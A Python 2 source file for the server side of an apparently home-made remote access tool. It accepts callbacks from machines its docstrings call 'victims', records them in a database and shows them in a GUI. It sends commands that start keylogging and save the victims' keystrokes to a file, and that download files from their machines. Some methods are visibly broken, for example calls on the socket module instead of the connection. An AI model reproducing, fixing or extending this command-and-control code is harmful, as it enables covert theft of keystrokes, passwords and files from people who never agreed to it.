from __future__ import print_function
import socket
import datetime
import threading
from Tkinter import END, NORMAL
import db
import Connection

class Server:
    """
    Server class to handle server operations
    These include:
        1. accept connections
        2. pass information to client GUI
        3. execute commands from client.py
        4. Handle DB operations
    """

    def __init__(self, client):
        """
        takes a client object created in run.py
        :param client:
        """
        global cli
        cli = client
        return

    def getIP(f):
        """
        get the IP of machine the server class is running on by connecting to www.google.com
        and reading the IP address
        """
        s = socket.socket()
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('google.com', 0))
        host = s.getsockname()[0]
        s.close()
        return host

    port = 44444
    cli = None
    s = socket.socket()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((getIP("d"), port))
    s.listen(5)
    DB = db.DB()

    @staticmethod
    def newConn(nc):
        """
        function is used in thread to handle when client has disconnected
        Not very efficient but consistently checks to see if victim is connected
        :param nc: connection object
        :return:
        """
        while (True):
            try:
                nc.socket.getpeername()
            except:
                ip = nc.ip
                hostname = nc.hostname
                Server.updateTextbox(str(ip[0]) + "@ " + hostname + " has disconnected...\n")
                return

    @staticmethod
    def trimMessage(m):
        """
        trims the message received from victim to readable form
        :param m: string from socket.recv()
        :return:
        """
        newM = m.split('\x00')[0]
        return newM

    @staticmethod
    def waitForConns():
        """
        used in thread when waiting for victims to callback
        """
        Server.updateTextbox("Waiting for connections...\n")
        while (True):
            global s
            c, addr = Server.s.accept()
            hostname = Server.trimMessage(c.recv(256))
            nc = Connection.Connection(addr, hostname, c)
            Server.DB.insert(nc)
            Server.updateTextbox(str(nc.hostname) + "@ " + str(nc.ip[0]) + " has connected..." +"\n")
            cli.connections.append(str(nc.ip[0]) + " - " + str(nc.hostname))
            cli.redrawClientMenu()
            t = threading.Thread(target=Server.newConn, args=[nc])
            t.setDaemon(True)
            t.start()

    @staticmethod
    def updateTextbox(s):
        """
        sends string to be put into text box on client GUI
        :param s: string
        :return:
        """
        cli.text.config(state=NORMAL)
        cli.text.insert(END, s)

    def keyLog(conn):
        conn.socket.sendall("log")
        Server.recvKeyLogs(conn)


    def recvKeyLogs(conn):
        """
        keys pressed by victim are handled by this function
        they are logged in a text file
        """
        host = Server.DB.findBySock(conn.socket)
        date = str(datetime.date.today())
        f = open(date+'_keys.txt', 'w')
        while (True):
            key = socket.recv(512)
            f.write(key)
            print(key[0][0])

    #need to make this handle Connection objects and no list
    def whatDo(cmd):
        """
        handles command from client.py
        decides what command the user wants to execute
        """
        conn = Server.DB.getConnectionHostIP(cmd[0].ip, cmd[0].hostname)
        if (cmd[1] == "log"):
            Server.keyLog(conn)
        elif ("download" in cmd[1]):
            Server.downloadFile(conn)


    def downloadFile(sock):
        """
         fucntion that requests and handles download
         sock: socket object
        """
        sock.send("send")
        f = open("test.jpg", "w")
        while (True):
            line = sock.recv(1024)
            print(line)
            f.write(line)


    def startServer(self):
        t = threading.Thread(target=Server.waitForConns)
        t.setDaemon(True)
        t.start()
